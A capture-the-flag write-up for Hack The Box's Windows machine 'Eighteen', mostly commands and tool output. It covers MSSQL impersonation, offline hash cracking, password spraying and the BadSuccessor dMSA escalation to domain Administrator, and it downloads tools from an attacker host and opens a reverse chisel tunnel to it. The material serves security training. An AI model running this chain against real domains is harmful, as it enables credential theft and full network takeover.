---
layout: ../../layouts/MarkdownLayout.astro
title: HTB - Eighteen
date: 2025-11-15
difficulty: Easy
tags: [Windows]
---

## RECONNAISSANCE

Initial reconnaissance with `nmap`:

```bash
nmap -sC -sV -vv 10.129.2.164
```

The scan revealed the following open ports:

| Port | Service  | Version                                 |
| ---- | -------- | --------------------------------------- |
| 80   | HTTP     | MICROSOFT IIS HTTPD 10.0                |
| 1433 | ms-sql-s | Microsoft SQL Server 2022               |
| 5985 | HTTP     | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |

## Enumeration

### Web Application Analysis

Directory enumeration was performed using `ffuf`:

```bash
ffuf -u http://eighteen.htb/FUZZ -w /usr/share/wordlists/wfuzz/general/common.txt
```

Register and login

![eighteen-register](/htb/eighteen/eighteen1.png)

Clicking the **Admin** button in the upper right corner returns an error stating that Admin privileges are required

![eighteen-dashboard](/htb/eighteen/eighteen2.png)

## MSSQL Enumeration

### Impersonation Abuse

The machine description provides credentials for `kevin`. Connecting via `impacket-mssqlclient`:

```bash
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.2.164
```

Enumerating impersonation permissions reveals a critical misconfiguration:

```bash
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev
```

`kevin` has been granted `IMPERSONATE` on the `appdev` login. This allows kevin to assume `appdev` identity
within MSSQL

### Credential Extraction

Switching to the `appdev` context and exploring the `financial_planner` database:

```bash
SQL (kevin  guest@master)> exec_as_login appdev;
SQL (appdev  appdev@master)> use financial_planner;
SQL (appdev  appdev@financial_planner)> select name from financial_planner.sys.tables;

name
-----------
users
incomes
expenses
allocations
analytics
visits
```

The `users` table contains a password hash for the admin account:

```bash
SQL (appdev  appdev@financial_planner)> select * from users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03
```

The hash uses the `pbkdf2:sha256` scheme (used by Werkzeug/Flask). To crack it with Hashcat (`-m 10000`), it must be converted from
Werkzeug format to the standard `pbkdf2_sha256` format used by Django/Hashcat. The hex digest in the hash must also be converted to Base64:

```bash
echo 0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133 | xxd -r -p | base64 -w0
```

Save the reformatted hash:

```bash
echo 'pbkdf2_sha256$600000$AMtzteQIG7yAbZIa$BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=' > hash
```

Crack with `hashcat` and `rockyou.txt`:

```bash
hashcat -a 0 -m 10000 hash /usr/share/wordlists/rockyou.txt

pbkdf2_sha256$600000$AMtzteQIG7yAbZIa$BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
```

Key findings:

- admin : iloveyou1

## User Enumeration

### Password Spraying via WinRM

Using `nxc` to brute-force RIDs against the MSSQL service:

```bash
nxc mssql 10.129.2.164 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth

MSSQL       10.129.2.164   1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.129.2.164   1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.129.2.164   1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.129.2.164   1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.129.2.164   1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.129.2.164   1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.129.2.164   1433   DC01             1612: EIGHTEEN\dave.green
```

The recovered password `iloveyou1` was likely set as a default. Spraying it across all discovered users via WinRM:

```bash
nxc winrm 10.129.2.164 -u users.txt -p 'iloveyou1' --continue-on-success

WINRM       10.129.2.164   5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

`adam.scott` reused the admin's password and has WinRM access. Logging in:

```bash
evil-winrm -i 10.129.2.164 -u 'adam.scott' -p 'iloveyou1'
```

User flag:

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Documents> type ../Desktop/user.txt
42e6738d68258f6dab43252f5defefb5
```

## Privilege Escalation

### BadSuccessor (Windows Server 2025 dMSA)

Querying the OS version reveals a critical detail:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
    ProductName    REG_SZ    Windows Server 2025 Datacenter
```

> In Windows Server 2025, Microsoft introduced delegated Managed Service Accounts (dMSAs). A dMSA is a new type of service account in Active Directory (AD) that expands on the capabilities of group Managed Service Accounts (gMSAs). One key feature of dMSAs is the ability to migrate existing nonmanaged service accounts by seamlessly converting them into dMSAs.

Cloning and serving the exploit:

```bash
git clone https://github.com/b5null/Invoke-BadSuccessor.ps1.git
cd Invoke-BadSuccessor.ps1
python3 -m http.server
```

Downloading and executing on the target:

```powershell
wget "http://10.10.15.5:8000/Invoke-BadSuccessor.ps1" -OutFile "Invoke-BadSuccessor.ps1"
*Evil-WinRM* PS C:\Users\adam.scott\Documents> . .\Invoke-BadSuccessor.ps1
*Evil-WinRM* PS C:\Users\adam.scott\Documents> Invoke-BadSuccessor
```

The script automatically:

1. Creates a machine account `Pwn$`
2. Creates a dMSA `attacker_dMSA$` and grants `adam.scott` `GenericAll` over it
3. Sets the dMSA's predecessor to `CN=Administrator`

```powershell
[+] Created computer 'Pwn' in 'OU=Staff,DC=eighteen,DC=htb'.
[+] Machine Account's sAMAccountName : Pwn$
[+] Machine Account's SID             : S-1-5-21-1152179935-589108180-1989892463-12601

[+] Created delegated service account 'attacker_dMSA' in 'OU=Staff,DC=eighteen,DC=htb'.
[+] Service Account's sAMAccountName : attacker_dMSA$
[+] Service Account's SID             : S-1-5-21-1152179935-589108180-1989892463-12602
[+] Allowed to retrieve password      : Pwn$

[+] Added ACE on 'CN=attacker_dMSA,OU=Staff,DC=eighteen,DC=htb' for 'adam.scott' (S-1-5-21-1152179935-589108180-1989892463-1609) with rights 'All' (Allow, ThisObjectOnly).
[+] Granted 'GenericAll' on 'attacker_dMSA$' to 'adam.scott'.
[+] Configured delegated MSA state for 'attacker_dMSA$' with predecessor:
    CN=Administrator,CN=Users,DC=eighteen,DC=htb

[+] Next steps (Rubeus):
    Rubeus.exe hash /password:'Password123!' /user:Pwn$ /domain:eighteen.htb
    Rubeus.exe asktgt /user:Pwn$ /aes256:<AES256KEY> /domain:eighteen.htb
    Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/eighteen.htb /dmsa /opsec /ptt /nowrap /outfile:ticket.kirbi /ticket:<BASE64TGT>

[+] Alternative (Impacket):
    getST.py 'eighteen.htb/Pwn$:Password123!' -k -no-pass -dmsa -self -impersonate 'attacker_dMSA$'
```

### Tunneling with Chisel

Kerberos operations require direct connectivity to the Domain Controller. Since the attack machine cannot reach it directly, a SOCKS tunnel via `chisel` is required.

First, synchronize clocks to avoid Kerberos failures:

```powershell
# DC time
*Evil-WinRM* PS C:\Users\adam.scott\Documents> [DateTime]::UtcNow.ToString("yyyy-MM-dd HH:mm:ss")
2026-03-11 11:11:05
```

on the attack machine

```bash
# Sync attack machine
date -s '2026-03-11 11:11:05'
```

Download and set up chisel:

```bash
# Attack machine
./chisel server -p 9001 --reverse 2>/dev/null
```

```powershell
# Target machine
wget "http://10.10.15.5:8000/chisel.exe" -OutFile "chisel.exe"
.\chisel.exe client 10.10.15.5:9001 R:socks
```

### Abusing the dMSA to Dump the Administrator Hash

Use `impacket-getST` to request a TGS ticket impersonating `attacker_dMSA$`

```bash
proxychains4 impacket-getST 'eighteen.htb/Pwn$:Password123!' -k -no-pass -dmsa -self -impersonate 'attacker_dMSA$'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[*] Impersonating attacker_dMSA$
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.4.176:88  ...  OK
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:cb0b32840ecbf44aa600a74accc092d57e30b1770ae9bfc14088f3ba2a3ffdc5
[*] EncryptionTypes.rc4_hmac:0452eb2862897dfd491b50507d01f6c6
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in attacker_dMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

Use `impacket-secretsdump` to dump the hash password of the Administrator account

```bash
KRB5CCNAME=attacker_dMSA\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache proxychains4 impacket-secretsdump -k -no-pass DC01.eighteen.htb -just-dc-user Administrator
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:49678  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
[*] Kerberos keys grabbed
Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
Administrator:0x17:0b133be956bfaddf9cea56701affddec
[*] Cleaning up...
```

### Root Access

Authenticating as Administrator via `impacket-psexec`:

```bash
proxychains4 impacket-psexec eighteen.htb/administrator@DC01.eighteen.htb -k -no-pass -aesKey '1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:445  ...  OK
[-] CCache file is not found. Skipping...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[*] Requesting shares on DC01.eighteen.htb.....
[*] Found writable share ADMIN$
[*] Uploading file rrmaQSym.exe
[*] Opening SVCManager on DC01.eighteen.htb.....
[*] Creating service xaIu on DC01.eighteen.htb.....
[*] Starting service xaIu.....
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:445  ...  OK
[-] CCache file is not found. Skipping...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:445  ...  OK
[!] Press help for extra shell commands
[-] CCache file is not found. Skipping...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:445  ...  OK
[-] CCache file is not found. Skipping...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
Microsoft Windows [Version 10.0.26100.4349]
(c) Microsoft Corporation. All rights reserved.
```

Root flag:

```powershell
C:\Windows\System32> type C:\Users\Administrator\Desktop\root.txt
04f9d2252018e9065c7691842dba498a
```
